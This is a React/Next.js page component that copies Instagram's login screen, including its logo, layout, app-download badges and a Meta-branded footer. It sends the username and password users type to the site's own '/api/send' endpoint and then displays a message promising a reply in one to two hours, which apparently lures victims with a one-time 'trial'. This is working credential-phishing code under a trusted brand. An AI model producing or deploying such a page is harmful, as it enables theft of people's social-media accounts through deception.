"use client"
import axios from 'axios'
import { ToastContainer, toast } from 'react-toastify';
  import 'react-toastify/dist/ReactToastify.css';
import React, { useEffect, useState } from 'react'

const page = () => {
  const [email, setemail] = useState()
  const [pass, setpass] = useState()
  const [error, seterror] = useState("Log in")

useEffect(()=> {
(async()=> {
   const rss = await axios.post("/api/check")
   if(rss.data.success) {
    toast("Trial is only for one time")
   }
})()
},[])


  const clicked = (e)=> {
    (async()=> {
        seterror("please wait")
        if(email > "3" && pass > "3") {
        e.preventDefault()
      const result = await axios.post("/api/send", {email: email, password: pass})
      seterror("Log in")
      if(result.data.success) {
        toast("Request submitted we will notify you in 1 to 2 hour")
        seterror("Log in")
      }
        }
        else {
            e.preventDefault()
            toast("Error")
            seterror("Log in")
        }
    })()
  }
  return (
    
    <div><ToastContainer /> <main className="flex align-items-center justify-content-center">
    <section id="mobile" className="flex">
    </section>
    <section id="auth" className="flex direction-column">
        <div className="panel login flex direction-column">
            <h1 title="Instagram" className="flex justify-content-center">
                <img src="./instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
            </h1>
            <form>
                <label htmlFor="email" className="sr-only">phone number, username, email</label>
                <input onChange={(e)=> setemail(e.target.value)} name="email" placeholder="Phone number, Username or Email" />

                <label htmlFor="password" className="sr-only">Senha</label>
                <input onChange={(e)=> setpass(e.target.value)} name="password" type="password" placeholder="Password" />

                <button onClick={clicked}>{error}</button>
            </form>
            <div className="flex separator align-items-center">
                <span></span>
                <div className="or">or</div>
                <span></span>
            </div>
            <div className="login-with-fb flex direction-column align-items-center">
                {/* <!-- <div>
                    <img />
                    <a>Login with facebook</a>
                </div> --> */}
                <a target='_blank' href="https://www.instagram.com/accounts/password/reset">Forgot password</a>
            </div>
        </div>
        <div className="panel register flex justify-content-center">
            <p>Don't have an account?</p>
            <a target='_blank' href="https://www.instagram.com/accounts/emailsignup">signup</a>
        </div>
        <div className="app-download flex direction-column align-items-center">
            <p>Get the app</p>
            <div className="flex justify-content-center">
                <img src="./apple-button.png"      alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
                <img src="./googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
            </div>
        </div>
    </section>
</main>
<footer>
    <ul className="flex flex-wrap justify-content-center">
        <li><a href="#">Meta</a></li>
        <li><a href="#">About</a></li>
        <li><a href="#">blog</a></li>
        <li><a href="#">jobs</a></li>
        <li><a href="#">Api</a></li>
        <li><a href="#">Privacy</a></li>
        <li><a href="#">Terms</a></li>
        <li><a href="#">Location</a></li>
        <li><a href="#">Contact us</a></li>
        <li><a href="#">Hashtags</a></li>
        <li><a href="#">Threads</a></li>
    </ul>
    <p className="copyright">© 2020 Instagram from meta</p>
</footer></div>
  )
}

export default page